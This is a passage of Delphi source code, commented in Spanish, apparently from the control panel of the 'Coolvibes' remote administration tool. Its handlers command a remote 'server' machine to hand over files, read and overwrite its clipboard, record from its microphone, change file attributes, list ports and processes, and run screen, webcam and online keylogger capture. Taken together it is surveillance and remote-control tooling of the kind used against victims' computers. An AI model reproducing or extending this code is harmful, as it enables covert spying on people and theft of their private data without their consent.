            ThumbsDBCatalog.read(WideChr, 2);
            if WideChr <> 0 then
              begin
                FileName := FileName + char(WideChr);
              end;
          until WideChr = 0;
          //additional 00 00 word at each item end
          ThumbsDBCatalog.read(WideChr, 2);

          //calculate name of item from catalog index
          //for any unknown reason, the name is calculated from index as
          // inttostr(1. digit) + inttostr(2. digit) + ... (reverse order)
          IndexStr := '';
          dwIndex := ThmInfo.dwIndex;
          while dwIndex > 0 do
            begin
              j := dwIndex mod 10;
              IndexStr := IndexStr + IntToStr(j);
              dwIndex := dwIndex div 10;
            end;

          //read thumbnail as JPEG file
          ThmInfo.jpgThumb := TJPEGImage.Create;
          ThumbsDB_JPEG := ThumbsDBFile.OpenStream(IndexStr, STGM_READ or STGM_SHARE_EXCLUSIVE);
          try
            //12 bytes in from of JPEG stream
            ThumbsDB_JPEG.read(ThmInfo.dwUnknown1, 4);
            ThumbsDB_JPEG.read(ThmInfo.dwUnknown1, 4);
            ThumbsDB_JPEG.read(ThmInfo.dwSizeOfJPGStream, 4);

            //read stream as JPEG and store in thumb info structure
            try
              ThmInfo.jpgThumb.LoadFromStream(ThumbsDB_JPEG);
            except
            end;

            for o := 0 to listviewarchivos.Items.Count - 1 do
              begin
                if AnsiLowerCase(listviewarchivos.Items[o].Caption) = AnsiLowerCase(FileName) then
                  begin
                    if (listviewarchivos.Items[o].imageindex <> 3) and (listviewarchivos.Items[o].imageindex <> 4) then
                      begin
                        sleep(100); //Si se baja mucho este valor algunas imagenes no cargan, ni idea porque pasa eso...

                        bit := tbitmap.Create();

                        bit.assign(ThmInfo.jpgThumb);
                        nbit := tbitmap.Create();
                        bit.pixelformat := pf32bit;
                        nbit.Width := IconosGrandes.Width;
                        nbit.Height := IconosGrandes.Height;

                        //centramos la imagen
                        tmpint := (nbit.Height - bit.Height) div 2; //"top" de la esquina sup izq
                        tmpint2 := (nbit.Width - bit.Width) div 2; //"left" de la esquina sup izq
                        if tmpint < 0 then tmpint := 0;
                        if tmpint2 < 0 then tmpint2 := 0;

                        if not ((bit.Width > nbit.Width) or (bit.Height > nbit.Height)) then
                          StretchBlt(nBit.Canvas.Handle, tmpint2, tmpint, nBit.Width, nBit.Height, Bit.Canvas.Handle, 0, 0, nBit.Width, nBit.Height, SRCCOPY)
                        else
                          StretchBlt(nBit.Canvas.Handle, tmpint2, tmpint, Bit.Width, Bit.Height, Bit.Canvas.Handle, 0, 0, Bit.Width, Bit.Height, SRCCOPY);

                        nbit.Width := IconosGrandes.Width;
                        nbit.Height := IconosGrandes.Height;
                        t := Imglist.Add(nbit, nil);
                        listviewarchivos.Items[o].imageindex := IconosGrandes.Count + t;
                        Estado(_('Cargadas ') + IntToStr(t + 1) + _(' de ') + IntToStr(FCatalogItemCount) + ' Miniaturas.');
                        nbit.Free;
                        bit.Free;
                        bit := nil;
                        nbit := nil;
                      end;
                  end;
              end;

          finally
            ThumbsDB_JPEG.Free;

          end;
          //save structure to list
          ThumbnailItems.AddObject(AnsiLowerCase(FileName), ThmInfo);
        end;
    finally
      ThumbsDBCatalog.Free;
    end;
  finally
    ThumbsDBFile.Free;
  end;
  IconosGrandes.addimages(imglist);
  listviewarchivos.Items.endupdate;
  Estado(_('Miniaturas cargadas!'));
end;

procedure TFormControl.Abrircarpetadescargas1Click(Sender: TObject);
begin
  CrearDirectoriosUsuario();
  ShellExecute(0, 'open', PChar(DirDescargas), '', PChar(DirDescargas), SW_NORMAL);
end;

procedure TFormControl.BuscarArchivos1Click(Sender: TObject);
begin
  PageControlArchivos.ActivePage := TabSheetBuscar;
end;

procedure TFormControl.ListViewArchivosCustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  if item = nil then Exit;
  if item.subitems.Count < 3 then Exit;

  if lowercase(item.Caption) = 'thumbs.db' then //archivos de miniatura de imagenes
    Sender.Canvas.Font.Color := clBlue
  else if ((Pos('Oculto', item.subitems[2]) > 0) or (Pos('Sistema', item.subitems[2]) > 0)) then //Ocultos o Sistema en gris
    Sender.Canvas.Font.Color := clGray;

end;

procedure TFormControl.Oculto2Click(Sender: TObject);
var
  CurrentAtrib: string;
begin
  if Servidor.Connection.Connected then
    begin
      mslistviewitem := ListViewArchivos.Selected;
      while Assigned(mslistviewitem) do
        begin
          CurrentAtrib := '';
          if not (Pos(_('Oculto'), mslistviewitem.subitems[2]) > 0) then //cambiamos
            CurrentAtrib := 'Oculto ';
          if (Pos(_('Sistema'), mslistviewitem.subitems[2]) > 0) then
            CurrentAtrib := CurrentAtrib + 'Sistema ';
          if (Pos(_('Lectura'), mslistviewitem.subitems[2]) > 0) then
            CurrentAtrib := CurrentAtrib + 'Lectura ';

          Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
            mslistviewitem.Caption + '|' + CurrentAtrib + '|');
          mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
        end;
      btnactualizararchivos.Click;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Sistema1Click(Sender: TObject);
var
  CurrentAtrib: string;
begin
  if Servidor.Connection.Connected then
    begin
      mslistviewitem := ListViewArchivos.Selected;
      while Assigned(mslistviewitem) do
        begin
          CurrentAtrib := '';
          if (Pos(_('Oculto'), mslistviewitem.subitems[2]) > 0) then //cambiamos
            CurrentAtrib := 'Oculto ';
          if not (Pos(_('Sistema'), mslistviewitem.subitems[2]) > 0) then
            CurrentAtrib := CurrentAtrib + 'Sistema ';
          if (Pos(_('Lectura'), mslistviewitem.subitems[2]) > 0) then
            CurrentAtrib := CurrentAtrib + 'Lectura ';

          Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
            mslistviewitem.Caption + '|' + CurrentAtrib + '|');
          mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
        end;
      btnactualizararchivos.Click;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Slolectura1Click(Sender: TObject);
var
  CurrentAtrib: string;
begin
  if Servidor.Connection.Connected then
    begin
      mslistviewitem := ListViewArchivos.Selected;
      while Assigned(mslistviewitem) do
        begin
          CurrentAtrib := '';
          if (Pos(_('Oculto'), mslistviewitem.subitems[2]) > 0) then //cambiamos
            CurrentAtrib := 'Oculto ';
          if (Pos(_('Sistema'), mslistviewitem.subitems[2]) > 0) then
            CurrentAtrib := CurrentAtrib + 'Sistema ';
          if not (Pos(_('Lectura'), mslistviewitem.subitems[2]) > 0) then
            CurrentAtrib := CurrentAtrib + 'Lectura ';

          Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
            mslistviewitem.Caption + '|' + CurrentAtrib + '|');
          mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
        end;
      btnactualizararchivos.Click;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.SpeedButtonRutasRapidasClick(Sender: TObject);
var
  popupPoint: TPoint;
begin
  popupPoint.X := SpeedButtonRutasRapidas.Left;
  popupPoint.Y := SpeedButtonRutasRapidas.Top + (SpeedButtonRutasRapidas.Height div 2);
  popupPoint := ClientToScreen(popupPoint);

  PopupRutasRapidas.popup(popupPoint.X, popupPoint.Y);
end;

procedure TFormControl.Windir1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('GORUTA|WINDIR')
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Directoriodesistema1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('GORUTA|SYSDIR')
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);

end;

procedure TFormControl.Misdocumentos1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('GORUTA|DOCUMENTOS')
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Escritorio1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('GORUTA|ESCRITORIO')
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.ArchivosRecientes1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('GORUTA|RECIENTE')
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Directoriodeinstalaciondecoolvibes1Click(
  Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('GORUTA|CURRENTDIR')
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.ComboBoxWebcamKeyPress(Sender: TObject;
  var Key: Char);
begin
  Key := #0;
end;

procedure TFormControl.ListViewVentanasCustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  if item = nil then Exit;
  if item.subitems.Count > 0 then
    if item.subitems[1] = _('Activa') then
      begin
        Sender.Canvas.Font.Style := [fsbold];
        Sender.Canvas.Font.Color := clGreen;
      end;
end;

procedure TFormControl.TabSheetTransferenciasShow(Sender: TObject);
begin
  TabSheetTransferencias.Highlighted := False;
end;

procedure TFormControl.TabSheetServidorShow(Sender: TObject);
begin
  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
    BtnActualizarServidorInfo.Click;
end;

procedure TFormControl.TabSheetInfoSistemaShow(Sender: TObject);
begin
  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
    BtnRefrescarInformacion.Click;
end;

procedure TFormControl.TabSheetVerArchivosShow(Sender: TObject);
begin
  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
    BtnVerunidades.Click;
end;

procedure TFormControl.Refrescar1Click(Sender: TObject);
begin
  if BtnVerRegisto.Enabled then
    BtnVerRegisto.Click;
end;

procedure TFormControl.SpeedButtonBuscarClick(Sender: TObject);
begin
  if not SpeedButtonBuscar.Enabled then Exit;

  if SpeedButtonBuscar.Caption = _('Comenzar') then //comenzar
    begin
      Encontrados := 0;
      TimerCuentaencontrados.Enabled := True;
      ParaDeBuscar := False;
      ListviewBuscar.Items.Count := 0;
      listviewbuscar.repaint;
      SpeedButtonBuscar.Caption := _('Parar');
      editbuscar.Enabled := False;
      TabSheetBuscar.highlighted := True;
      TabFileManager.highlighted := True;
      Servidor.Connection.WriteLn('STARTSEARCH|' + editbuscar.Text + '|');
    end
  else
    begin //Parar
      SpeedButtonBuscar.Enabled := False; //Para evitar que se pulse mas de una vez
      ParaDeBuscar := True;
      Servidor.Connection.WriteLn('STOPSEARCH');
    end;
end;

procedure TFormControl.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin

  CheckBoxAutoCapturaScreen.Checked := False;
  CheckBoxAutoCamCapture.Checked := False;
  CheckBoxOnlineKeylogger.Checked := False;
end;

procedure TFormControl.ListViewBuscarContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  for i := 0 to PopupFileManager.Items.Count - 1 do
    begin
      PopupFileManager.Items[i].Visible := False; //Los escondemos todos
      PopupFileManager.Items[i].Enabled := False;
    end;

  if listviewbuscar.selected <> nil then
    begin
      Descargarfichero1.Enabled := True; //descargar
      Agregaracoladedescarga1.Enabled := True; //encolar decarga
      EjecutarAbrir1.Enabled := True; //Abrir/ejecutar
      Eliminar.Enabled := True; //Eliminar
      Previsualizarjpg1.Enabled := True; //Visor de imagenes avanzado
      AbrirCarpetaDescargas2.Enabled := True; //abrir directorio descargas
      Abrirdirectorio1.Enabled := True; //Abrir directorio del archivo
    end
  else
    begin
      Descargarfichero1.Enabled := False; //descargar
      Agregaracoladedescarga1.Enabled := False; //encolar decarga
      EjecutarAbrir1.Enabled := False; //Abrir/ejecutar
      Eliminar.Enabled := False; //Eliminar
      Previsualizarjpg1.Enabled := False; //Visor de imagenes avanzado
      AbrirCarpetaDescargas2.Enabled := True; //abrir directorio descargas
      Abrirdirectorio1.Enabled := False; //Abrir directorio del archivo
    end;

  Descargarfichero1.Visible := True; //descargar
  Agregaracoladedescarga1.Visible := True; //encolar decarga
  EjecutarAbrir1.Visible := True; //Abrir/ejecutar
  Eliminar.Visible := True; //Eliminar
  Previsualizarjpg1.Visible := True; //Visor de imagenes avanzado
  AbrirCarpetaDescargas2.Visible := True; //abrir directorio descargas
  Abrirdirectorio1.Visible := True; //Abrir directorio del archivo

end;

procedure TFormControl.Abrirdirectorio1Click(Sender: TObject);
begin
  PageControlArchivos.ActivePage := TabSheetVerArchivos;
  EditpathArchivos.Text := extractfilepath(listviewbuscar.selected.subitems[0]);
  BtnActualizarArchivos.Click;
end;

procedure TFormControl.FormShortCut(var Msg: TWMKey; var Handled: Boolean);
begin
  if not Self.Active then Exit;

  if Msg.charcode = VK_ESCAPE then
    Self.Close;

  if Msg.CharCode = VK_F5 then //Refresh!
    begin
      if PageControl.ActivePage = TabInfo then
        begin
          if PageControlInformacion.ActivePage = TabSheetServidor then
            BtnActualizarServidorInfo.Click
          else
            BtnRefrescarInformacion.Click;
        end
      else if PageControl.ActivePage = TabFileManager then
        begin
          if PageControlArchivos.ActivePage = TabSheetVerArchivos then
            BtnActualizarArchivos.Click;
        end
      else if PageControl.ActivePage = TabManagers then
        begin
          if PageControlManagers.ActivePage = TabProcesos then
            BtnRefrescarProcesos.Click
          else if PageControlManagers.ActivePage = TabVentanas then
            BtnRefrescarVentanas.Click
          else if PageControlManagers.ActivePage = TabRegistro then
            BtnVerRegisto.Click
          else if PageControlManagers.ActivePage = TabServicios then
            BtnServicios.Click
          else if PageControlManagers.ActivePage = TabPuertos then
            BtnRefrescarPuertos.Click;
        end
      else if PageControl.ActivePage = TabVigilancia then
        begin
          if PageControlVigilancia.ActivePage = TabScreencap then
            BtnCapturarScreen.Click
          else if PageControlVigilancia.ActivePage = TabWebcam then
            BtnCapturarWebcam.Click;
        end;
    end;
end;

procedure TFormControl.TabSheetBuscarShow(Sender: TObject);
begin
  if EditBuscar.Enabled then
    EditBuscar.Text := EditPathArchivos.Text + '*';

end;

// Portapapeles!

procedure TFormControl.SpeedButtonClipBoard1Click(Sender: TObject);
begin
  if not SpeedButtonClipBoard1.Enabled then Exit;
  SpeedButtonClipBoard1.Enabled := False;
  if Servidor.Connection.Connected then
    begin
      Servidor.Connection.Writeln('GETCLIP');
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.SpeedButtonClipBoard2Click(Sender: TObject);
var
  TempStr: string;
begin
  if Servidor.Connection.Connected then
    begin
      TempStr := MemoClipBoard.Text;
      TempStr := StringReplace(Trim(tempstr), #10, '|salto|', [rfReplaceAll]);
      TempStr := StringReplace((Tempstr), #13, '|salto2|', [rfReplaceAll]);
      Servidor.Connection.Writeln('SETCLIP|' + TempStr);
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.TabProcesosShow(Sender: TObject);
begin
  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
    BtnRefrescarProcesos.Click;
end;

procedure TFormControl.FormCloseQuery(Sender: TObject;
  var CanClose: Boolean);
begin
  FormMain.ControlWidth := Self.Width;
  FormMain.ControlHeight := Self.Height;
end;

procedure TFormControl.SpeedButtonCapAudioClick(Sender: TObject);
var
  formato: string;
  hz, canal, bits: string;
  i: Integer;
begin
  if not SpeedButtonCapAudio.Enabled then Exit;

  for i := 0 to ListViewAudioFormato.Items.Count - 1 do
    if ListViewAudioFormato.Items[i].Checked then
      ListViewAudioFormato.Items[i].selected := True;
  if StrToIntDef(Spineditaudio.Text, -1) = -1 then
    begin
      Estado(_('M�nimo 1 segundo'));
    end;
  if StrToIntDef(Copy(comboboxaudiodevices.Text, 1, 1), -1) = -1 then
    begin
      Estado(_('Dispositivo de audio no v�lido'));
    end
  else if ListViewAudioFormato.selected = nil then
    begin
      Estado(_('Selecciona un formato de audio'));
    end
  else
    begin
      SpeedbuttoncapAudio.Enabled := False;
      Hz := Copy(listviewaudioformato.selected.Caption, 1, Pos(' ', listviewaudioformato.selected.Caption) - 1);

      if listviewaudioformato.selected.subitems[0] = 'Mono' then
        Canal := '1'
      else
        Canal := '2';

      Bits := listviewaudioformato.selected.subitems[1];
      UltimoFormato := hz + '-' + canal + '-' + bits;

      Servidor.connection.writeln('GETAUDIO|' + Spineditaudio.Text + '|' + hz + '-' + canal + '-' + bits + '|' + Copy(comboboxaudiodevices.Text, 1, 1) + '|');
    end;
end;

//Pedimos que nos listen los dipositivos de audio disponibles;
//Adem�s tambi�n nos listan los formatos de audio que admite cada uno de los dispositivos

procedure TFormControl.SpeedButtonListarAudioClick(Sender: TObject);
begin
  if not SpeedButtonListarAudio.Enabled then Exit;
  SpeedButtonListarAudio.Enabled := False;
  if Servidor.Connection.Connected then
    begin
      Servidor.connection.writeln('GETADRIVERS');
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.CheckBoxCapturarAudioAutomaticamenteClick(
  Sender: TObject);
begin
  if CheckBoxCapturarAudioAutomaticamente.Checked then
    begin
      SpeedButtonCapAudioClick(nil);
      TabAudio.highlighted := True;
    end
  else
    TabAudio.highlighted := False;
end;

procedure TFormControl.PopupAudioPopup(Sender: TObject);
var
  status: Boolean;
  i: Integer;
begin
  if listviewaudio.selected = nil then
    status := False
  else
    status := True;

  for i := 0 to popupaudio.Items.Count - 1 do
    popupaudio.Items[i].Enabled := status;
end;

procedure TFormControl.TabAudioShow(Sender: TObject);
begin
  if (FormOpciones.CheckBoxAutoRefrescar.Checked) and (ComboboxAudioDevices.Text = '') then
    SpeedButtonListarAudio.Click;
end;

function TFormControl.InitWavFile(var Ms: TMemoryStream; nChannels, nSamplesPerSec, wBitsPerSample: Word; b: string): Integer;
var
  RiffSize: Integer;
  Fmt_Size: Integer;
  WaveBuffLen: Integer;
  wFormato: TWaveFormatEx;
const
  RiffStr = 'RIFF';
  WaveStr = 'WAVE';
  Fmt_Str = 'fmt ';
  DataStr = 'data';
begin
  wFormato.WFormatTag := WAVE_FORMAT_PCM;
  wFormato.NChannels := nChannels; //1=mono 2= stereo
  wFormato.wBitsPerSample := wBitsPerSample; //8,16
  wFormato.NSamplesPerSec := NSamplesPerSec; //HZ
  wFormato.NBlockAlign := (wFormato.nChannels * wFormato.wBitsPerSample) div 8;
  wFormato.NAvgBytesPerSec := wFormato.NSamplesPerSec * wFormato.NBlockAlign;
  wFormato.cbSize := 0;

  WaveBuffLen := Length(b);
  RiffSize := 20 + SizeOf(wFormato) + WaveBuffLen;
  Fmt_Size := SizeOf(wFormato);
  with ms do
    begin
      //escribimos la cabecera del archivo .wav
      Write(RiffStr[1], Length(RiffStr));
      Write(RiffSize, SizeOf(Integer));
      Write(WaveStr[1], Length(WaveStr));
      Write(Fmt_Str[1], Length(Fmt_Str));
      Write(Fmt_Size, SizeOf(Integer));
      Write(wFormato, SizeOf(TWaveFormatEx));
      Write(DataStr[1], Length(DataStr));

      Write(WaveBuffLen, SizeOf(Integer));

      //Esribimos la onda
      Write(b[1], Length(b));
    end;

end;

procedure TFormControl.SpinEditAudioChange(Sender: TObject);
var
  Size, i: Integer;
begin
  for i := 0 to ListViewAudioFormato.Items.Count - 1 do
    if ListViewAudioFormato.Items[i].Checked then
      ListViewAudioFormato.Items[i].selected := True;

  if ListviewAudioFormato.selected <> nil then
    begin

      Size := StrToInt(Copy(listviewAudioFormato.selected.Caption, 1, Pos(' ', listviewAudioFormato.selected.Caption) - 1));

      if listviewAudioFormato.selected.subitems[1] = '16' then
        Size := Size * 2;

      if listviewAudioFormato.selected.subitems[0] = 'Stereo' then
        begin
          Size := Size * 2;
        end;

      Size := Size * StrToIntDef(SpinEditAudio.Text, 1);
      LabelLengthAudio.Caption := _('Tama�o') + ': ' + IntToStr(Size div 1024) + ' KB';
    end;
end;

procedure TFormControl.Eliminar2Click(Sender: TObject);
var
  tmpitem: Tlistitem;
begin
  mslistviewitem := ListViewAudio.Selected;

  while Assigned(mslistviewitem) do
    begin
      Freemem(mslistviewitem.data);
      tmpitem := mslistviewitem;
      mslistviewitem := ListViewAudio.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      tmpitem.Delete;
    end;
end;

procedure TFormControl.Guardar1Click(Sender: TObject);
var
  MS: TMemoryStream;
  Buffer: string;
  Total: string;
  Tempstr1, tempstr2, tempstr3, tmpstr: string;
  Ruta: string;
begin
  DlgGuardar.Title := _('Guardar Audio ::Coolvibes::');
  DlgGuardar.InitialDir := GetCurrentDir();
  DlgGuardar.Filter := _('Audio') + ' .wav|*.wav';
  DlgGuardar.DefaultExt := 'wav';
  if DlgGuardar.Execute then
    begin
      mslistviewitem := ListViewAudio.Selected;
      while Assigned(mslistviewitem) do
        begin
          setlength(Buffer, StrToInt(mslistviewitem.subitems.Strings[4]));
          movememory(Pointer(Buffer), mslistviewitem.data, StrToInt(mslistviewitem.subitems.Strings[4]));

          //Agregamos solamente la onda, ignorando los headers
          Total := Total + Copy(buffer, 1 + Length(buffer) - StrToInt(mslistviewitem.subitems[0]), StrToInt(mslistviewitem.subitems[0]));

          TmpStr := mslistviewitem.subitems[3];
          TempStr1 := Copy(TmpStr, 1, Pos('-', TmpStr) - 1); //HZ
          Delete(TmpStr, 1, Pos('-', TmpStr));
          TempStr2 := Copy(TmpStr, 1, Pos('-', TmpStr) - 1); //Canal
          Delete(TmpStr, 1, Pos('-', TmpStr));
          TempStr3 := TmpStr; //Bits

          mslistviewitem := ListViewAudio.GetNextItem(mslistviewitem, sdAll, [isSelected]);
        end;
      //Si el grupo de sonidos que queremos guardar son de distinta frecuencia
      try
        MS := TMemoryStream.Create;
        InitWavFile(MS, StrToInt(TempStr2), StrToInt(TempStr1), StrToInt(TempStr3), total);
        Ms.savetofile(DlgGuardar.FileName);
      finally
        ms.Free;
      end;
      Estado(_('Audio guardado con �xito:') + ' ' + DlgGuardar.FileName);
    end;
end;

procedure TFormControl.Reproducir1Click(Sender: TObject);
var
  MS: TMemoryStream;
  Buffer: string;
  Total: string;
  Tempstr1, tempstr2, tempstr3, tmpstr: string;
  Ruta: string;
begin
  mslistviewitem := ListViewAudio.Selected;
  while Assigned(mslistviewitem) do
    begin
      setlength(Buffer, StrToInt(mslistviewitem.subitems.Strings[4]));
      movememory(Pointer(Buffer), mslistviewitem.data, StrToInt(mslistviewitem.subitems.Strings[4]));

      //Agregamos solamente la onda, ignorando los headers
      Total := Total + Copy(buffer, 1 + Length(buffer) - StrToInt(mslistviewitem.subitems[0]), StrToInt(mslistviewitem.subitems[0]));

      TmpStr := mslistviewitem.subitems[3];
      TempStr1 := Copy(TmpStr, 1, Pos('-', TmpStr) - 1); //HZ
      Delete(TmpStr, 1, Pos('-', TmpStr));
      TempStr2 := Copy(TmpStr, 1, Pos('-', TmpStr) - 1); //Canal
      Delete(TmpStr, 1, Pos('-', TmpStr));
      TempStr3 := TmpStr; //Bits

      mslistviewitem := ListViewAudio.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
  //Si el grupo de sonidos que queremos guardar son de distinta frecuencia

  MS := TMemoryStream.Create;
  InitWavFile(MS, StrToInt(TempStr2), StrToInt(TempStr1), StrToInt(TempStr3), total);
  sndPlaySound(Ms.memory, SND_MEMORY or SND_ASYNC);
end;

procedure TFormControl.ListViewAudioFormatoClick(Sender: TObject);
begin
  SpinEditAudioChange(nil);
end;

procedure TFormControl.SpeedButton1Click(Sender: TObject);
var
  itmnum: Integer;
  i: Integer;
begin
  itmnum := ListviewBuscar.Items.Count;

  if SpeedbuttonBuscar.Caption = _('Comenzar') then
    begin
      ListviewBuscar.Items.Count := 0;
      listviewbuscar.repaint;
      for i := 0 to itmnum - 1 do
        begin
          searchitems[i].nombre := '';
          searchitems[i].tamanio := '';
          searchitems[i].tipo := '';
          searchitems[i].atributos := '';
          searchitems[i].Fechamodify := 0;
          searchitems[i].tamanioreal := 0;
        end;
    end;
  LabelNumeroEncontrados.Caption := '';
end;

procedure TFormControl.ListViewBuscarData(Sender: TObject;
  Item: TListItem);
var
  Index: Integer;
begin

  if reversed then
    Index := encontrados - item.Index - 1
  else
    Index := item.Index;

  if not ((item.Index >= encontrados) or (item.Index < 0)) then
    begin
      Item.Caption := extractfilename(SearchItems[Index].nombre);
      try
        item.ImageIndex := Iconnum(item.Caption, True);
      except
      end;
      Item.SubItems.Add(SearchItems[Index].nombre);
      Item.SubItems.Add(SearchItems[Index].tamanio);
      Item.SubItems.Add(SearchItems[Index].tipo);

      Item.SubItems.Add(SearchItems[Index].atributos);
      Item.SubItems.Add(DateToStr(FileDateToDateTime(SearchItems[Index].Fechamodify))
        + ' ' +
        TimeToStr(FileDateToDateTime(SearchItems[Index].Fechamodify)));
      Item.SubItems.Add(IntToStr(SearchItems[Index].tamanioreal));
    end
  else
    item.Caption := 'error';
end;

procedure TFormControl.TimerCuentaEncontradosTimer(Sender: TObject);
begin
  TimerCuentaencontrados.Enabled := TabSheetBuscar.highlighted;
  ListviewBuscar.Items.Count := Encontrados;
  LabelNumeroEncontrados.Caption := _('Encontrados: ') + IntToStr(Encontrados);
end;

procedure TFormControl.LabelVelocidadClick(Sender: TObject);
begin
  messageboxw(0, pwidechar(_('Velocidad')), PWchar(_('Cuanta m�s velocidad m�s CPU se consumir� en la maquina remota. Si no tienes prisa marca lenta')), 0);
end;

procedure TFormControl.SpeedButton2Click(Sender: TObject);
begin
  ParaDeListar := True;
end;

procedure TFormControl.ListViewBuscarColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: Integer;
  tmpstr: string;

  procedure QuickSort(var A: array of TSearchItem; iLo, iHi: Integer);
  var
    Lo, Hi: Integer;
    Pivot: string;
    T: Tsearchitem;
  begin
    Lo := iLo;
    Hi := iHi;
    Pivot := A[(Lo + Hi) div 2].sortdata;
    repeat
      while strIcomp(PChar(A[Lo].sortdata), PChar(pivot)) < 0 do
        Inc(Lo);
      while StrIComp(PChar(pivot), PChar(A[Hi].sortdata)) < 0 do
        Dec(Hi);
      if Lo <= Hi then
        begin
          T := A[Lo];
          A[Lo] := A[Hi];
          A[Hi] := T;
          Inc(Lo);
          Dec(Hi);
        end;
    until Lo > Hi;
    if Hi > iLo then QuickSort(A, iLo, Hi);
    if Lo < iHi then QuickSort(A, Lo, iHi);
  end;

begin
  if column.Index = 4 then Exit;

  if ColumnaOrdenada = column.Index then
    Reversed := not reversed
  else
    begin
      if column.Index = 2 then //tama�o
        begin
          for i := 0 to encontrados do
            begin
              tmpstr := IntToStr(SearchItems[i].TamanioReal);
              while Length(tmpstr) < 12 do //Para tratarlas como strings
                Tmpstr := '.' + tmpstr;
              SearchItems[i].sortdata := tmpstr;
            end;
        end
      else if column.Index = 5 then //tama�o
        begin
          for i := 0 to encontrados do
            begin
              tmpstr := IntToStr(round(SearchItems[i].FechaModify));
              while Length(tmpstr) < 12 do //Para tratarlas como strings
                Tmpstr := '.' + tmpstr;
              SearchItems[i].sortdata := tmpstr;
            end;
        end
      else if column.Index = 1 then
        begin
          for i := 0 to encontrados do
            SearchItems[i].sortdata := SearchItems[i].Nombre;
        end
      else if column.Index = 0 then
        begin
          for i := 0 to encontrados do
            SearchItems[i].sortdata := extractfilename(SearchItems[i].Nombre);
        end
      else if column.Index = 3 then
        begin
          for i := 0 to encontrados do
            SearchItems[i].sortdata := extractfilename(SearchItems[i].tipo);
        end;

      Quicksort(SearchItems, 0, encontrados - 1);
      for i := 0 to encontrados do
        SearchItems[i].sortdata := '';
    end;

  ColumnaOrdenada := column.Index;
  listviewbuscar.repaint;
end;

procedure TFormControl.CreateParams(var Params: TCreateParams);
begin
  inherited CreateParams(Params);
  if FormOpciones.CheckBoxCCIndependiente.Checked then
    begin
      Params.WndParent := GetDesktopWindow();
      Params.exStyle := Params.exStyle or WS_EX_APPWINDOW;
    end;
end;

procedure TFormControl.FormShow(Sender: TObject);
begin
  if PrimeraVezQueMeMuestro then
    begin
      PrimeraVezQueMeMuestro := False;
      CargarIconos(True);
    end;
end;

procedure TFormControl.BtnRefrescarPuertosClick(Sender: TObject);
begin
  if not BtnRefrescarPuertos.Enabled then Exit;
  BtnRefrescarPuertos.Enabled := False;
  ListviewPuertos.Enabled := False;
  CheckBoxPuertos.Enabled := False;
  if Servidor.Connection.Connected then
    begin
      if CheckBoxPuertos.Checked then
        Servidor.Connection.Writeln('TCPUDP|TRUE')
      else
        Servidor.Connection.Writeln('TCPUDP|FALSE');
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);

end;

procedure TFormControl.ListViewPuertosCompare(Sender: TObject; Item1,
  Item2: TListItem; Data: Integer; var Compare: Integer);
var
  Str1, Str2: string;
begin
  if Columna = 0 then //Si Columna = 0 usar Item.Caption
    begin
      Str1 := Item1.Caption;
      Str2 := Item2.Caption;
    end
  else
    begin //Si Columna > 0 usar Item.SubItems[Columna -1]
      if Item1.SubItems.Count < Columna then
        Str1 := ''
      else
        Str1 := Item1.SubItems[Columna - 1];
      if Item2.SubItems.Count < Columna then
        Str2 := ''
      else
        Str2 := Item2.SubItems[Columna - 1];
    end;
  if Columna in [0..5, 7] then //Son tratadas como cadenas
    Compare := CompareText(Str1, Str2)
  else //Columna 6, PID
    Compare := StrToIntDef(Str1, 0) - StrToIntDef(Str2, 0);
  //Si la columna ya fue ordenada anteriormente, invertir el orden
  if Columna = ColumnaOrdenada then
    Compare := Compare * -1; //Invertimos el resultado
  (Sender as TListView).SetFocus;
end;

